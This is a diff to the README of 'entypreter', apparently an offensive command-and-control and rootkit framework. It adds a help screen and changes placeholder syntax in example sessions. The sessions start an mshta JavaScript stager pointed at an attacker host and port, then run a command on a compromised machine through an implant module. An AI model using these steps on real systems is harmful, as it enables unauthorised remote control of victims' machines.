@@ -28,6 +28,20 @@
 
 ***
 
+# How to execute entypreter
+
+> entypreter -h
+
+    usage: entypreter [-h] [--autorun AUTORUN] [-o] [--restore RESTORE]
+
+    optional arguments:
+      -h, --help         show this help message and exit
+      --autorun AUTORUN  A file containing commands to autorun at startup.
+      -o                 Launch Entypreter Rootkit safety.
+      --restore RESTORE  An Entypreter restore json file.
+
+***
+
 # The entypreter examples
 
     INFO: There are some Entypreter examples - 
@@ -38,8 +52,8 @@
 > entypreter
 
     (entypreter: sta/js/mshta)# info
-    (entypreter: sta/js/mshta)# set SRVHOST [LHOST]
-    (entypreter: sta/js/mshta)# set SRVPORT [LPORT]
+    (entypreter: sta/js/mshta)# set SRVHOST <lhost>
+    (entypreter: sta/js/mshta)# set SRVPORT <lport>
     (entypreter: sta/js/mshta)# run
     
 ## Starting entypreter implant
@@ -49,7 +63,7 @@
     (entypreter: sta/js/mshta)# use implant/manage/exec_cmd
     (entypreter: implant/manage/exec_cmd)# info
     (entypreter: implant/manage/exec_cmd)# set CMD ipconfig
-    (entypreter: implant/manage/exec_cmd)# set session [SESSION]
+    (entypreter: implant/manage/exec_cmd)# set session <session>
     (entypreter: implant/manage/exec_cmd)# run
     
 ***
